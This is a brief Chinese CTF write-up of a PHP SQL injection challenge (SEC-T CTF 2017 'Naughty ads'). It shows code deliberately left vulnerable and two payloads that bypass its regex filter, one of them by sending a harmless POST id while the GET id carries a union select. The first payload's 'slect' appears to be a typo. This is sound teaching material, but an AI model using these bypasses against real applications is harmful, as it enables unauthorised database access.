# Challenge 
```php 
<?php
if(isset($_REQUEST['id'])){
	if(preg_match("/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i", $_REQUEST['id'])){
		die("Attack detected!!!");
	}
}

$sql = "select * from xxx where id = '{$_GET['id']}'";
echo $sql;
$result = sql_query($_GET['id']);
?>
```

# Solution 
## 法一
正面刚正则匹配。
payload：
```
http://localhost:2500/?id=1'/*1*/union slect * from flag %23
```
![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/8.png?raw=true)

## 法二
[$_REQUEST](http://php.net/manual/zh/reserved.variables.request.php)变量默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。在 php.ini 配置文件中，有一个参数variables_order
![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/5.png?raw=true)

其中几个字母（EGPCS）对应如下： Environment, Get, Post, Cookie, Server。这些字母的出现顺序，表明了数据的加载顺序。从三种默认配置来看，相对顺序均是`GP`，也就是说只要有POST参数进来，那么它就会覆盖同名的GET参数。如下图；
![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/6.png?raw=true)

所以就本题而言，如果在GET参数id处注入数据（比如 union select），而同时我们又通过POST方法传入一个id参数，那么服务器检测的是无害的POST数据，而在进行查询时带入的是有害的GET数据。

payload：
```
http://localhost:2500/?id=1' union select * from flag %23

POST: id=1
```
![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/9.png?raw=true)

# Refference
+ SEC-T CTF 2017 Naughty ads - Web